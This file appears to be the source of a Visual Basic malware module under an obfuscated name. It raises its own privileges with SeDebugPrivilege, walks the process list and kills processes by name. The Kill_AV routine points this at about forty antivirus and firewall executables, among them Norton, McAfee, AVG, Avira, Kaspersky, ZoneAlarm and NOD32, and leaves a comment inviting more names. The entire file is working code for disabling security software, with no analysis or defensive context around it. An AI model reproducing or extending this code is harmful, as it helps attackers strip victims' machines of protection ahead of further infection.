Attribute VB_Name = "kilhgfgdf"
Option Explicit
Const MAX_PATH& = 260
Public Declare Function TerminateProcess _
    Lib "kernel32" (ByVal ApphProcess As Long, _
    ByVal uExitCode As Long) As Long
    
Public Declare Function OpenProcess Lib _
    "kernel32" (ByVal dwDesiredAccess As Long, _
    ByVal blnheritHandle As Long, _
    ByVal dwAppProcessId As Long) As Long
    
Public Declare Function ProcessFirst _
    Lib "kernel32" Alias "Process32First" _
    (ByVal hSnapshot As Long, _
    uProcess As PROCESSENTRY32) As Long

Public Declare Function ProcessNext _
    Lib "kernel32" Alias "Process32Next" _
    (ByVal hSnapshot As Long, _
    uProcess As PROCESSENTRY32) As Long

Public Declare Function CreateToolhelpSnapshot _
    Lib "kernel32" Alias "CreateToolhelp32Snapshot" _
    (ByVal lFlags As Long, _
    lProcessID As Long) As Long

Public Declare Function CloseHandle _
    Lib "kernel32" (ByVal hObject As Long) As Long

Public Type LUID
  lowpart As Long
highpart As Long
End Type
Public Type TOKEN_PRIVILEGES
    PrivilegeCount As Long
    LuidUDT As LUID
    Attributes As Long
End Type

Public Const TOKEN_ADJUST_PRIVILEGES = &H20
Public Const TOKEN_QUERY = &H8
Public Const SE_PRIVILEGE_ENABLED = &H2
Public Const PROCESS_ALL_ACCESS = &H1F0FFF

Public Declare Function GetVersion Lib "kernel32" () As Long
Public Declare Function GetCurrentProcess _
    Lib "kernel32" () As Long

Public Declare Function OpenProcessToken _
    Lib "advapi32" (ByVal ProcessHandle As Long, _
    ByVal DesiredAccess As Long, _
    TokenHandle As Long) As Long

Public Declare Function LookupPrivilegeValue _
    Lib "advapi32" Alias "LookupPrivilegeValueA" _
    (ByVal lpSystemName As String, _
    ByVal lpName As String, _
    lpLuid As LUID) As Long

Public Declare Function AdjustTokenPrivileges _
    Lib "advapi32" (ByVal TokenHandle As Long, _
    ByVal DisableAllPrivileges As Long, _
    NewState As TOKEN_PRIVILEGES, _
    ByVal BufferLength As Long, _
    PreviousState As Any, _
    ReturnLength As Any) As Long

Public Type PROCESSENTRY32
   dwSize As Long
   cntUsage As Long
   th32ProcessID As Long
   th32DefaultHeapID As Long
   th32ModuleID As Long
   cntThreads As Long
   th32ParentProcessID As Long
   pcPriClassBase As Long
   dwFlags As Long
   szexeFile As String * MAX_PATH
End Type

Public Function KillApp(myName As String) As Boolean
  Const TH32CS_SNAPPROCESS As Long = 2&
  Const PROCESS_ALL_ACCESS = 0
  Dim uProcess As PROCESSENTRY32
  Dim rProcessFound As Long
  Dim hSnapshot As Long
  Dim szExename As String
  Dim exitCode As Long
  Dim myProcess As Long
  Dim AppKill As Boolean
  Dim appCount As Integer
  Dim i As Integer
  On Local Error GoTo Finish
  appCount = 0

  uProcess.dwSize = Len(uProcess)
  hSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
  rProcessFound = ProcessFirst(hSnapshot, uProcess)
  Do While rProcessFound
       i = InStr(1, uProcess.szexeFile, Chr(0))
       szExename = LCase$(Left$(uProcess.szexeFile, i - 1))
       If Right$(szExename, Len(myName)) = LCase$(myName) Then
           KillApp = True
           appCount = appCount + 1
           myProcess = OpenProcess(PROCESS_ALL_ACCESS, False, _
                       uProcess.th32ProcessID)
            If KillProcess(uProcess.th32ProcessID, 0) Then
            End If
     End If
     rProcessFound = ProcessNext(hSnapshot, uProcess)
Loop
Call CloseHandle(hSnapshot)
Exit Function
Finish:
    MsgBox "Error!"
End Function

Public Function KillProcess(ByVal hProcessID As Long, Optional ByVal _
                    exitCode As Long) As Boolean
    Dim hToken As Long
    Dim hProcess As Long
    Dim tp As TOKEN_PRIVILEGES

    If GetVersion() >= 0 Then
        If OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES Or _
            TOKEN_QUERY, hToken) = 0 Then
            GoTo CleanUp
        End If
        If LookupPrivilegeValue("", "SeDebugPrivilege", tp.LuidUDT) = 0 Then
            GoTo CleanUp
        End If
        tp.PrivilegeCount = 1
        tp.Attributes = SE_PRIVILEGE_ENABLED
        If AdjustTokenPrivileges(hToken, False, tp, 0, ByVal 0&, _
           ByVal 0&) = 0 Then
            GoTo CleanUp
        End If
    End If
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, hProcessID)
    If hProcess Then
        KillProcess = (TerminateProcess(hProcess, exitCode) <> 0)
        CloseHandle hProcess
    End If

    If GetVersion() >= 0 Then
        tp.Attributes = 0
        AdjustTokenPrivileges hToken, False, tp, 0, ByVal 0&, ByVal 0&

CleanUp:
        If hToken Then CloseHandle hToken
    End If

End Function


Sub Kill_AV()
    'add more here
KillApp ("nav.exe")
KillApp ("avgcc.exe")
KillApp ("njeeves.exe")
KillApp ("ccapps.exe")
KillApp ("kav.exe")
KillApp ("nvcoas.exe")
KillApp ("mcshield.exe")
KillApp ("apvxdwin.exe")
KillApp ("pccguide.exe")
KillApp ("ashavast.exe")
KillApp ("ashsimpl.exe")
KillApp ("ashdisp.exe")
KillApp ("avgupsvc.exe")
KillApp ("avgamsvr.exe")
KillApp ("avgnt.exe")
KillApp ("avguard.exe")
KillApp ("avp32.exe")
KillApp ("avpmon.exe")
KillApp ("zonealarm.exe")
KillApp ("vshwin32.exe")
KillApp ("tbscan.exe")
KillApp ("scan32.exe")
KillApp ("navw.exe")
KillApp ("avptc32.exe")
KillApp ("avgctrl.exe")
KillApp ("avpcc.exe")
KillApp ("navsched.exe")
KillApp ("f-stopw.exe")
KillApp ("avpm.exe")
KillApp ("avp.exe")
KillApp ("fprot.exe")
KillApp ("avpnt.exe")
KillApp ("avconsol.exe")
KillApp ("vsstat.exe")
KillApp ("tca.exe")
KillApp ("normist.exe")
KillApp ("navw32.exe")
KillApp ("n32scan.exe")
KillApp ("f-prot.exe")
KillApp ("nod32kui.exe")
KillApp ("nod32krn.exe")
End Sub





